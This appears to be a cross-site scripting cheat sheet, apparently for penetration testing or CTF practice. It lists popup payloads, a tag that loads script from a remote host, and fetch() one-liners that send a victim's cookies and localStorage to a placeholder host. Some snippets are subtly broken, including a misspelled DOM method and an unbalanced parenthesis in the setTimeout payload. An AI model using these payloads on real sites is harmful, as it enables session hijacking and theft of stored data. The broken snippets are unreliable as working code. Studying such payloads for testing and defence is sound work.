# Basic JavaScript popups
`<script>alert(0)</script>`
`<img src='x' onerror='alert(0)'>`
`<iframe src="javascript:alert(0)"></iframe>`
# Obtain a script from remote host - useful if there is a character limit
`<script src='http://127.0.0.1'></script>`
# Useful JavaScript to interact with specific in-page elements
`document.getElementsByTagName("Tag-name-here")`
`document.getElementsbyId("Id-here")`
`document.getElementsByClassName("Class-name-here")`
`document.getElementsByName("Name-here")`
`document.getElementsByTagNameNS("Tag-in-namespace-here")`
# Performing a get request to a third-party service
`fetch("http://127.0.0.1")`

Extracting cookies:
`fetch("http://127.0.0.1?x="+document.cookie)`

Ensuring the content is treated as a sting:
`fetch("http://127.0.0.1?x="+JSON.stringify(document.cookie))`

Encoding content which has characters that can mess with things:
`fetch("http://127.0.0.1?x="+encodeURIComponent(JSON.stringify(document.cookie)))`

# Odds N' Ends

Timeout function in case in-page elements load at different times
`<img src='x' onerror=setTimeout(function(){fetch("http://127.0.0.1"))}, 5000);'>`

Accessing local storage
`encodeURIComponent(JSON.stringify(localStorage))`